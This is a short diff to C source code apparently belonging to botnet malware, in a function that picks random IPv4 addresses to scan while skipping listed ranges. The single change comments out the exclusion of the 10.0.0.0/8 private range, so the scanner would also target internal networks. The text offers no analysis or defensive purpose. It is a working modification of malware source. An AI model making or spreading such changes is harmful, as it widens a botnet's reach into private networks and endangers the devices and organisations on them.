@@ -690,7 +690,7 @@ static ipv4_t get_random_ip(void)
           (o1 == 3) ||                              // 3.0.0.0/8        - General Electric Company
           (o1 == 15 || o1 == 16) ||                 // 15.0.0.0/7       - Hewlett-Packard Company
           (o1 == 56) ||                             // 56.0.0.0/8       - US Postal Service
-          (o1 == 10) ||                             // 10.0.0.0/8       - Internal network
+        //   (o1 == 10) ||                             // 10.0.0.0/8       - Internal network
           (o1 == 192 && o2 == 168) ||               // 192.168.0.0/16   - Internal network
           (o1 == 172 && o2 >= 16 && o2 < 32) ||     // 172.16.0.0/14    - Internal network
           (o1 == 100 && o2 >= 64 && o2 < 127) ||    // 100.64.0.0/10    - IANA NAT reserved
